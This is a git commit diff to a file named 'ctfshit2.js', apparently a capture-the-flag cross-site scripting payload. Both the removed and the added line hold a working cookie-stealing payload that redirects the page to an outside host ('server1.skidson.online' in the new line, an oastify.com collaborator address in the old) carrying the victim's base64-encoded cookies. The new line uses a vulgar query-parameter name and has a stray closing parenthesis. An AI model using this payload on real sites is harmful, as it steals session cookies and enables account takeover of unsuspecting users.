6d0ee593e9c17a20368b5980ac65403975825a14
chakal <54026816+chakal1337@users.noreply.github.com>
2022-10-26 10:49:59 -0700

    Update ctfshit2.js

--- ctfshit2.js
+++ ctfshit2.js
@@ -1,1 +1,1 @@
-document.location = "http://jxkq105hfpz4b1a96z90unfpwg26qv.oastify.com/?foo="+btoa(document.cookies));
+document.location = "http://server1.skidson.online/?cunt="+btoa(document.cookie));
